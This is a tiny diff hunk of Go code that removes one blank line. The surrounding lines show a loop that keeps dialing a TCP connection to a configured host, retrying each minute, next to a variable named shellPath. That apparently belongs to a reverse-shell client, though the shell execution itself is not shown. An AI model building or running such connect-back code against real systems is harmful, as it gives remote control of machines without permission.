@@ -14,7 +14,6 @@ var shellPath string
 func main() {
 	for {
 		c, err := net.Dial("tcp", host)
-
 		if err != nil {
 			time.Sleep(time.Minute)
 			continue
